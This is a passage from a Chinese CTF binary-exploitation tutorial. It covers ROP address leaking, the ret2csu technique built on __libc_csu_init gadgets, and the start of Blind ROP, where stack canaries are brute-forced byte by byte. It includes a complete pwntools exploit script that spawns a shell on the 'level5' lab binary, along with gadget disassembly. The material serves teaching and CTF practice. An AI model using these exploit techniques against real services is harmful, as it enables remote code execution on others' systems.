11(0xb)</li>\n</ul>\n</li>\n</ul>\n<p><strong>地址寻找小结</strong></p>\n<p>在整个漏洞利用过程中，我们总是免不了要去寻找一些地址，常见的寻找地址的类型，有如下几种</p>\n<p><strong>通用寻找</strong></p>\n<p><strong>直接地址寻找</strong></p>\n<p>程序中已经给出了相关变量或者函数的地址了。这时候，我们就可以直接进行利用了。</p>\n<p><strong>got表寻找</strong></p>\n<p>有时候我们并不一定非得直接知道某个函数的地址，可以利用GOT表的跳转到对应函数的地址。当然，如果我们非得知道这个函数的地址，我们可以利用write，puts等输出函数将GOT表中地址处对应的内容输出出来（<strong>前提是这个函数已经被解析一次了</strong>）。</p>\n<p><strong>有libc</strong></p>\n<p><strong>相对偏移寻找</strong>，这时候我们就需要考虑利用libc中函数的基地址一样这个特性来寻找了。其实__libc_start_main就是libc在内存中的基地址。<strong>注意：不要选择有wapper的函数，这样会使得函数的基地址计算不正确。</strong>常见的有wapper的函数有（待补充）。    </p>\n<p><strong>无libc</strong></p>\n<p>其实，这种情况的解决策略分为两种</p>\n<ul>\n<li>想办法获取libc</li>\n<li>想办法直接获取对应的地址。</li>\n</ul>\n<p>而对于想要泄露的地址，我们只是单纯地需要其对应的内容，所以puts和write均可以。</p>\n<ul>\n<li>puts会有\\x00截断的问题</li>\n<li>write可以指定长度输出的内容。</li>\n</ul>\n<p>下面是一些相应的方法</p>\n<p><strong>DynELF</strong></p>\n<p>前提是我们可以泄露任意地址的内容。</p>\n<ul>\n<li><strong>如果要使用write函数泄露的话，一次最好多输出一些地址的内容，因为我们一般是只是不断地向高地址读内容，很有可能导致高地址的环境变量被覆盖，就会导致shell不能启动。</strong></li>\n</ul>\n<p><strong>libc数据库</strong></p>\n<p>## 更新数据库<br> ./get<br> ## 将已有libc添加到数据库中<br> ./add libc.so<br> ## Find all the libc’s in the database that have the given names at the given addresses.<br> ./find function1 addr function2 addr<br> ## Dump some useful offsets, given a libc ID. You can also provide your own names to dump.<br> ./Dump some useful offsets</p>\n<p>去libc的数据库中找到对应的和已经出现的地址一样的libc，这时候很有可能是一样的。</p>\n<ul>\n<li>libcdb.com</li>\n</ul>\n<p><strong>当然，还有上面提到的LibcSearcher。</strong></p>\n<p><strong>ret2dl-resolve</strong></p>\n<p>当ELF文件采用动态链接时，got表会采用延迟绑定技术。当第一次调用某个libc函数时，程序会调用_dl_runtime_resolve函数对其地址解析。因此，我们可以利用栈溢出构造ROP链，伪造对其他函数（如：system）的解析。这也是我们在高级rop中会介绍的技巧。</p>\n<h3 id=\"中级了-o-￣▽￣-ブ！！！\"><a href=\"#中级了-o-￣▽￣-ブ！！！\" class=\"headerlink\" title=\"中级了@@@o(￣▽￣)ブ！！！\"></a>中级了@@@o(<em>￣▽￣</em>)ブ！！！</h3><p><strong>ret2__libc_scu_init</strong></p>\n<p>中级ROP主要是使用了一些比较巧妙的Gadgets。</p>\n<p>在64位程序中，函数的前6个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的gadgets。 这时候，我们可以利用x64下的__libc_scu_init中的gadgets。这个函数是用来对libc进行初始化操作的，而一般的程序都会调用libc函数，所以这个函数一定会存在。我们先来看一下这个函数(当然，不同版本的这个函数有一定的区别)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:00000000004005C0 ; void _libc_csu_init(void)</span><br><span class=\"line\">.text:00000000004005C0                 public __libc_csu_init</span><br><span class=\"line\">.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16\u0018o</span><br><span class=\"line\">.text:00000000004005C0                 push    r15</span><br><span class=\"line\">.text:00000000004005C2                 push    r14</span><br><span class=\"line\">.text:00000000004005C4                 mov     r15d, edi</span><br><span class=\"line\">.text:00000000004005C7                 push    r13</span><br><span class=\"line\">.text:00000000004005C9                 push    r12</span><br><span class=\"line\">.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry</span><br><span class=\"line\">.text:00000000004005D2                 push    rbp</span><br><span class=\"line\">.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class=\"line\">.text:00000000004005DA                 push    rbx</span><br><span class=\"line\">.text:00000000004005DB                 mov     r14, rsi</span><br><span class=\"line\">.text:00000000004005DE                 mov     r13, rdx</span><br><span class=\"line\">.text:00000000004005E1                 sub     rbp, r12</span><br><span class=\"line\">.text:00000000004005E4                 sub     rsp, 8</span><br><span class=\"line\">.text:00000000004005E8                 sar     rbp, 3</span><br><span class=\"line\">.text:00000000004005EC                 call    _init_proc</span><br><span class=\"line\">.text:00000000004005F1                 test    rbp, rbp</span><br><span class=\"line\">.text:00000000004005F4                 jz      short loc_400616</span><br><span class=\"line\">.text:00000000004005F6                 xor     ebx, ebx</span><br><span class=\"line\">.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]</span><br><span class=\"line\">.text:0000000000400600</span><br><span class=\"line\">.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54\u0019j</span><br><span class=\"line\">.text:0000000000400600                 mov     rdx, r13</span><br><span class=\"line\">.text:0000000000400603                 mov     rsi, r14</span><br><span class=\"line\">.text:0000000000400606                 mov     edi, r15d</span><br><span class=\"line\">.text:0000000000400609                 call    qword ptr [r12+rbx*8]</span><br><span class=\"line\">.text:000000000040060D                 add     rbx, 1</span><br><span class=\"line\">.text:0000000000400611                 cmp     rbx, rbp</span><br><span class=\"line\">.text:0000000000400614                 jnz     short loc_400600</span><br><span class=\"line\">.text:0000000000400616</span><br><span class=\"line\">.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34\u0018j</span><br><span class=\"line\">.text:0000000000400616                 add     rsp, 8</span><br><span class=\"line\">.text:000000000040061A                 pop     rbx</span><br><span class=\"line\">.text:000000000040061B                 pop     rbp</span><br><span class=\"line\">.text:000000000040061C                 pop     r12</span><br><span class=\"line\">.text:000000000040061E                 pop     r13</span><br><span class=\"line\">.text:0000000000400620                 pop     r14</span><br><span class=\"line\">.text:0000000000400622                 pop     r15</span><br><span class=\"line\">.text:0000000000400624                 retn</span><br><span class=\"line\">.text:0000000000400624 __libc_csu_init endp</span><br></pre></td></tr></table></figure>\n\n<p>这里我们可以利用以下几点</p>\n<ul>\n<li>从0x000000000040061A一直到结尾，我们可以利用栈溢出构造栈上数据来控制rbx,rbp,r12,r13,r14,r15寄存器的数据。</li>\n<li>从0x0000000000400600到0x0000000000400609，我们可以将r13赋给rdx,将r14赋给rsi，将r15d赋给edi（需要注意的是，虽然这里赋给的是edi，<strong>但其实此时rdi的高32位寄存器值为0（自行调试）</strong>，所以其实我们可以控制rdi寄存器的值，只不过只能控制低32位），而这三个寄存器，也是x64函数调用中传递的前三个寄存器。此外，如果我们可以合理地控制r12与rbx，那么我们就可以调用我们想要调用的函数。比如说我们可以控制rbx为0，r12为存储我们想要调用的函数的地址。</li>\n<li>从0x000000000040060D到0x0000000000400614，我们可以控制rbx与rbp的之间的关系为rbx+1=rbp，这样我们就不会执行loc_400600，进而可以继续执行下面的汇编程序。这里我们可以简单的设置rbx=0，rbp=1。</li>\n</ul>\n<p>蒸米的一步一步学ROP之linux_x64篇中level5为例</p>\n<p>1.首先检查程序的安全保护</p>\n<p>➜ ret2__libc_csu_init git:(iromise) ✗ checksec level5<br>   Arch:   amd64-64-little<br>   RELRO:  Partial RELRO<br>   Stack:  No canary found<br>   NX:    NX enabled<br>   PIE:   No PIE (0x400000)</p>\n<p>程序为64位，开启了堆栈不可执行保护。</p>\n<p>2.其次，寻找程序的漏洞，可以看出程序中有一个简单的栈溢出</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">ssize_t</span> <span class=\"title\">vulnerable_function</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">char</span> buf; <span class=\"comment\">// [sp+0h] [bp-80h]@1</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> read(<span class=\"number\">0</span>, &amp;buf, <span class=\"number\">0x200</span>uLL);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>简单浏览下程序，发现程序中既没有system函数地址，也没有/bin/sh字符串，所以两者都需要我们自己去构造了。</p>\n<p><strong>注：这里我尝试在我本机使用system函数来获取shell失败了，应该是环境变量的问题，所以这里使用的是execve来获取shell。</strong></p>\n<p>3.基本利用思路如下：</p>\n<ul>\n<li>利用栈溢出执行libc_csu_gadgets获取write函数地址，并使得程序重新执行main函数</li>\n<li>根据libcsearcher获取对应libc版本以及execve函数地址</li>\n<li>再次利用栈溢出执行libc_csu_gadgets向bss段写入execve地址以及’/bin/sh’地址，并使得程序重新执行main函数。</li>\n<li>再次利用栈溢出执行libc_csu_gadgets执行execve(‘/bin/sh’)获取shell。</li>\n</ul>\n<p>exp如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> LibcSearcher</span><br><span class=\"line\"><span class=\"comment\">##context.log_level = &#x27;debug&#x27;</span></span><br><span class=\"line\">level5 = ELF(<span class=\"string\">&#x27;./level5&#x27;</span>)</span><br><span class=\"line\">sh = process(<span class=\"string\">&#x27;./level5&#x27;</span>)</span><br><span class=\"line\">write_got = level5.got[<span class=\"string\">&#x27;write&#x27;</span>]</span><br><span class=\"line\">read_got = level5.got[<span class=\"string\">&#x27;read&#x27;</span>]</span><br><span class=\"line\">main_addr = level5.symbols[<span class=\"string\">&#x27;main&#x27;</span>]</span><br><span class=\"line\">bss_base = level5.bss()</span><br><span class=\"line\">csu_front_addr = <span class=\"number\">0x0000000000400600</span></span><br><span class=\"line\">csu_end_addr = <span class=\"number\">0x000000000040061A</span></span><br><span class=\"line\">fakeebp = <span class=\"string\">&#x27;b&#x27;</span> * <span class=\"number\">8</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">csu</span>(<span class=\"params\">rbx, rbp, r12, r13, r14, r15, last</span>):</span></span><br><span class=\"line\">    <span class=\"comment\"># pop rbx,rbp,r12,r13,r14,r15</span></span><br><span class=\"line\">    <span class=\"comment\"># rbx should be 0,</span></span><br><span class=\"line\">    <span class=\"comment\"># rbp should be 1,enable not to jump</span></span><br><span class=\"line\">    <span class=\"comment\"># r12 should be the function we want to call</span></span><br><span class=\"line\">    <span class=\"comment\"># rdi=edi=r15d</span></span><br><span class=\"line\">    <span class=\"comment\"># rsi=r14</span></span><br><span class=\"line\">    <span class=\"comment\"># rdx=r13</span></span><br><span class=\"line\">    payload = <span class=\"string\">&#x27;a&#x27;</span> * <span class=\"number\">0x80</span> + fakeebp</span><br><span class=\"line\">    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(</span><br><span class=\"line\">        r13) + p64(r14) + p64(r15)</span><br><span class=\"line\">    payload += p64(csu_front_addr)</span><br><span class=\"line\">    payload += <span class=\"string\">&#x27;a&#x27;</span> * <span class=\"number\">0x38</span></span><br><span class=\"line\">    payload += p64(last)</span><br><span class=\"line\">    sh.send(payload)</span><br><span class=\"line\">    sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\">sh.recvuntil(<span class=\"string\">&#x27;Hello, World\\n&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">## RDI, RSI, RDX, RCX, R8, R9, more on the stack</span></span><br><span class=\"line\"><span class=\"comment\">## write(1,write_got,8)</span></span><br><span class=\"line\">csu(<span class=\"number\">0</span>, <span class=\"number\">1</span>, write_got, <span class=\"number\">8</span>, write_got, <span class=\"number\">1</span>, main_addr)</span><br><span class=\"line\">write_addr = u64(sh.recv(<span class=\"number\">8</span>))</span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">&#x27;write&#x27;</span>, write_addr)</span><br><span class=\"line\">libc_base = write_addr - libc.dump(<span class=\"string\">&#x27;write&#x27;</span>)</span><br><span class=\"line\">execve_addr = libc_base + libc.dump(<span class=\"string\">&#x27;execve&#x27;</span>)</span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;execve_addr &#x27;</span> + <span class=\"built_in\">hex</span>(execve_addr))</span><br><span class=\"line\"><span class=\"comment\">##gdb.attach(sh)</span></span><br><span class=\"line\"><span class=\"comment\">## read(0,bss_base,16)</span></span><br><span class=\"line\"><span class=\"comment\">## read execve_addr and /bin/sh\\x00</span></span><br><span class=\"line\">sh.recvuntil(<span class=\"string\">&#x27;Hello, World\\n&#x27;</span>)</span><br><span class=\"line\">csu(<span class=\"number\">0</span>, <span class=\"number\">1</span>, read_got, <span class=\"number\">16</span>, bss_base, <span class=\"number\">0</span>, main_addr)</span><br><span class=\"line\">sh.send(p64(execve_addr) + <span class=\"string\">&#x27;/bin/sh\\x00&#x27;</span>)</span><br><span class=\"line\">sh.recvuntil(<span class=\"string\">&#x27;Hello, World\\n&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">## execve(bss_base+8)</span></span><br><span class=\"line\">csu(<span class=\"number\">0</span>, <span class=\"number\">1</span>, bss_base, <span class=\"number\">0</span>, <span class=\"number\">0</span>, bss_base + <span class=\"number\">8</span>, main_addr)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n<p><strong>改进</strong></p>\n<p>在上面的时候，我们直接利用了这个通用gadgets，其输入的字节长度为128。但是，并不是所有的程序漏洞都可以让我们输入这么长的字节。那么当允许我们输入的字节数较少的时候，我们该怎么有什么办法呢？下面给出了几个方法</p>\n<p><strong>改进1-提前控制rbx与rbp</strong></p>\n<p>可以看到在我们之前的利用中，我们利用这两个寄存器的值的主要是为了满足cmp的条件，并进行跳转。如果我们可以提前控制这两个数，那么我们就可以减少16字节，即我们所需的字节数只需要112。</p>\n<p><strong>改进2-多次利用</strong></p>\n<p>其实，改进1也算是一种多次利用。我们可以看到我们的gadgets是分为两部分的，那么我们其实可以进行两次调用来达到的目的，以便于减少一次gadgets所需要的字节数。但这里的多次利用需要更加严格的条件</p>\n<ul>\n<li>漏洞可以被多次触发</li>\n<li>在两次触发之间，程序尚未修改r12-r15寄存器，这是因为要两次调用。</li>\n</ul>\n<p><strong>当然，有时候我们也会遇到一次性可以读入大量的字节，但是不允许漏洞再次利用的情况，这时候就需要我们一次性将所有的字节布置好，之后慢慢利用。</strong></p>\n<p><strong>gadget</strong></p>\n<p>其实，除了上述这个gadgets，gcc默认还会编译进去一些其它的函数</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_init</span><br><span class=\"line\">_start</span><br><span class=\"line\">call_gmon_start</span><br><span class=\"line\">deregister_tm_clones</span><br><span class=\"line\">register_tm_clones</span><br><span class=\"line\">__do_global_dtors_aux</span><br><span class=\"line\">frame_dummy</span><br><span class=\"line\">__libc_csu_init</span><br><span class=\"line\">__libc_csu_fini</span><br><span class=\"line\">_fini</span><br></pre></td></tr></table></figure>\n\n<p>我们也可以尝试利用其中的一些代码来进行执行。此外，由于PC本身只是将程序的执行地址处的数据传递给CPU，而CPU则只是对传递来的数据进行解码，只要解码成功，就会进行执行。所以我们可以将源程序中一些地址进行偏移从而来获取我们所想要的指令，只要可以确保程序不崩溃。</p>\n<p>需要一说的是，在上面的libc_csu_init中我们主要利用了以下寄存器</p>\n<ul>\n<li>利用尾部代码控制了rbx，rbp，r12，r13，r14，r15。</li>\n<li>利用中间部分的代码控制了rdx，rsi，edi。</li>\n</ul>\n<p>而其实libc_csu_init的尾部通过偏移是可以控制其他寄存器的。其中，0x000000000040061A是正常的起始地址，可以看到我们在0x000000000040061f处可以控制rbp寄存器，在0x0000000000400621处可以控制rsi寄存器。而如果想要深入地了解这一部分的内容，就要对汇编指令中的每个字段进行更加透彻地理解。如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  x/5i 0x000000000040061A</span><br><span class=\"line\">   0x40061a &lt;__libc_csu_init+90&gt;:   pop    rbx</span><br><span class=\"line\">   0x40061b &lt;__libc_csu_init+91&gt;:   pop    rbp</span><br><span class=\"line\">   0x40061c &lt;__libc_csu_init+92&gt;:   pop    r12</span><br><span class=\"line\">   0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13</span><br><span class=\"line\">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class=\"line\">gef➤  x/5i 0x000000000040061b</span><br><span class=\"line\">   0x40061b &lt;__libc_csu_init+91&gt;:   pop    rbp</span><br><span class=\"line\">   0x40061c &lt;__libc_csu_init+92&gt;:   pop    r12</span><br><span class=\"line\">   0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13</span><br><span class=\"line\">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class=\"line\">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class=\"line\">gef➤  x/5i 0x000000000040061A+3</span><br><span class=\"line\">   0x40061d &lt;__libc_csu_init+93&gt;:   pop    rsp</span><br><span class=\"line\">   0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13</span><br><span class=\"line\">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class=\"line\">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class=\"line\">   0x400624 &lt;__libc_csu_init+100&gt;:  ret</span><br><span class=\"line\">gef➤  x/5i 0x000000000040061e</span><br><span class=\"line\">   0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13</span><br><span class=\"line\">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class=\"line\">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class=\"line\">   0x400624 &lt;__libc_csu_init+100&gt;:  ret    </span><br><span class=\"line\">   0x400625:    nop</span><br><span class=\"line\">gef➤  x/5i 0x000000000040061f</span><br><span class=\"line\">   0x40061f &lt;__libc_csu_init+95&gt;:   pop    rbp</span><br><span class=\"line\">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class=\"line\">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class=\"line\">   0x400624 &lt;__libc_csu_init+100&gt;:  ret    </span><br><span class=\"line\">   0x400625:    nop</span><br><span class=\"line\">gef➤  x/5i 0x0000000000400620</span><br><span class=\"line\">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class=\"line\">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class=\"line\">   0x400624 &lt;__libc_csu_init+100&gt;:  ret    </span><br><span class=\"line\">   0x400625:    nop</span><br><span class=\"line\">   0x400626:    nop    WORD PTR cs:[rax+rax*1+0x0]</span><br><span class=\"line\">gef➤  x/5i 0x0000000000400621</span><br><span class=\"line\">   0x400621 &lt;__libc_csu_init+97&gt;:   pop    rsi</span><br><span class=\"line\">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class=\"line\">   0x400624 &lt;__libc_csu_init+100&gt;:  ret    </span><br><span class=\"line\">   0x400625:    nop</span><br><span class=\"line\">gef➤  x/5i 0x000000000040061A+9</span><br><span class=\"line\">   0x400623 &lt;__libc_csu_init+99&gt;:   pop    rdi</span><br><span class=\"line\">   0x400624 &lt;__libc_csu_init+100&gt;:  ret    </span><br><span class=\"line\">   0x400625:    nop</span><br><span class=\"line\">   0x400626:    nop    WORD PTR cs:[rax+rax*1+0x0]</span><br><span class=\"line\">   0x400630 &lt;__libc_csu_fini&gt;:  repz ret</span><br></pre></td></tr></table></figure>\n\n<p><strong>参考题目</strong></p>\n<ul>\n<li>2016 XDCTF pwn100</li>\n<li>2016 华山杯 SU_PWN</li>\n</ul>\n<p><strong>BROP</strong></p>\n<p>BROP(Blind ROP)于2014年由Standford的Andrea Bittau提出，其相关研究成果发表在Oakland 2014，其论文题目是<strong>Hacking Blind</strong></p>\n<p>BROP是没有对应应用程序的源代码或者二进制文件下，对程序进行攻击，劫持程序的执行流.</p>\n<ol>\n<li>源程序必须存在栈溢出漏洞，以便于攻击者可以控制程序流程。</li>\n<li>服务器端的进程在崩溃之后会重新启动，并且重新启动的进程的地址与先前的地址一样（这也就是说即使程序有ASLR保护，但是其只是在程序最初启动的时候有效果）。目前nginx,     MySQL, Apache, OpenSSH等服务器应用都是符合这种特性的。</li>\n</ol>\n<p>目前，大部分应用都会开启ASLR、NX、Canary保护。这里我们分别讲解在BROP中如何绕过这些保护，以及如何进行攻击。</p>\n<p><strong>基本思路</strong></p>\n<p>在BROP中，基本的遵循的思路如下</p>\n<ul>\n<li><p>判断栈溢出长度</p>\n</li>\n<li><ul>\n<li>暴力枚举</li>\n</ul>\n</li>\n<li><p>Stack Reading</p>\n</li>\n<li><ul>\n<li>获取栈上的数据来泄露canaries，以及ebp和返回地址。</li>\n</ul>\n</li>\n<li><p>Bind ROP</p>\n</li>\n<li><ul>\n<li>找到足够多的 gadgets      来控制输出函数的参数，并且对其进行调用，比如说常见的 write 函数以及puts函数。</li>\n</ul>\n</li>\n<li><p>Build the exploit</p>\n</li>\n<li><ul>\n<li>利用输出函数来 dump      出程序以便于来找到更多的 gadgets，从而可以写出最后的 exploit</li>\n</ul>\n</li>\n</ul>\n<p><strong>栈溢出长度</strong></p>\n<p>直接从1暴力枚举即可，直到发现程序崩溃。</p>\n<p><strong>Stack Reading</strong></p>\n<p>如下所示，这是目前经典的栈布局</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">buffer|canary|saved fame pointer|saved returned address</span><br></pre></td></tr></table></figure>\n\n<p>要向得到canary以及之后的变量，我们需要解决第一个问题，如何得到overflow的长度，这个可以通过不断尝试来获取。</p>\n<p>其次，关于canary以及后面的变量，所采用的的方法一致，这里我们以canary为例。</p>\n<p>canary本身可以通过爆破来获取，但是如果只是愚蠢地枚举所有的数值的话，显然是低效的。</p>\n<p>需要注意的是，攻击条件2表明了程序本身并不会因为crash有变化，所以每次的canary等值都是一样的。所以我们可以按照字节进行爆破。正如论文中所展示的，每个字节最多有256种可能，所以在32位的情况下，我们最多需要爆破1024次，64位最多爆破2048次。</p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210629162057713.png\" alt=\"image-20210629162057713\" style=\"zoom:67%;\" />\n\n<p><strong>Blind ROP</strong></p>\n<p>最朴素的执行write函数的方法就是构造系统调用。</p>\n<p>pop rdi; ret # socket<br> pop rsi; ret # buffer<br> pop rdx; ret # length<br> pop rax; ret # write syscall number<br> syscall</p>\n<p>但通常来说，这样的方法都是比较困难的，因为想要找到一个syscall的地址基本不可能。。。我们可以通过转换为找write的方式来获取。</p>\n<p><strong>BROP gadgets</strong></p>\n<p>首先，在libc_csu_init的结尾一长串的gadgets，我们可以通过偏移来获取write函数调用的前两个参数。正如文中所展示的</p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210629162209719.png\" alt=\"image-20210629162209719\" style=\"zoom:67%;\" />\n\n<p><strong>find a call write</strong></p>\n<p>我们可以通过plt表来获取write的地址。</p>\n<p><strong>control rdx</strong></p>\n<p>需要注意的是，rdx只是我们用来输出程序字节长度的变量，只要不为0即可。一般来说程序中的rdx经常性会不是零。但是为了更好地控制程序输出，我们仍然尽量可以控制这个值。但是，在程序</p>\n<p>pop rdx; ret</p>\n<p>这样的指令几乎没有。那么，我们该如何控制rdx的数值呢？这里需要说明执行strcmp的时候，rdx会被设置为将要被比较的字符串的长度，所以我们可以找到strcmp函数，从而来控制rdx。</p>\n<p>那么接下来的问题，我们就可以分为两项</p>\n<ul>\n<li><p>寻找gadgets</p>\n</li>\n<li><p>寻找PLT表</p>\n</li>\n<li><ul>\n<li>write入口</li>\n<li>strcmp入口</li>\n</ul>\n</li>\n</ul>\n<p><strong>寻找gadgets</strong></p>\n<p>首先，我们来想办法寻找gadgets。此时，由于尚未知道程序具体长什么样，所以我们只能通过简单的控制程序的返回地址为自己设置的值，从而而来猜测相应的gadgets。而当我们控制程序的返回地址时，一般有以下几种情况</p>\n<ul>\n<li>程序直接崩溃</li>\n<li>程序运行一段时间后崩溃</li>\n<li>程序一直运行而并不崩溃</li>\n</ul>\n<p>为了寻找合理的gadgets，我们可以分为以下两步</p>\n<p><strong>寻找stop gadgets</strong></p>\n<p>所谓stop gadget一般指的是这样一段代码：当程序的执行这段代码时，程序会进入无限循环，这样使得攻击者能够一直保持连接状态。</p>\n<p>其实stop gadget也并不一定得是上面的样子，其根本的目的在于告诉攻击者，所测试的返回地址是一个gadgets。</p>\n<p>之所以要寻找stop gadgets，是因为当我们猜到某个gadgtes后，如果我们仅仅是将其布置在栈上，由于执行完这个gadget之后，程序还会跳到栈上的下一个地址。如果该地址是非法地址，那么程序就会crash。这样的话，在攻击者看来程序只是单纯的crash了。因此，攻击者就会认为在这个过程中并没有执行到任何的useful gadget，从而放弃它。例子如下图</p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210629162456711.png\" alt=\"image-20210629162456711\" style=\"zoom:67%;\" />\n\n<p>但是，如果我们布置了stop 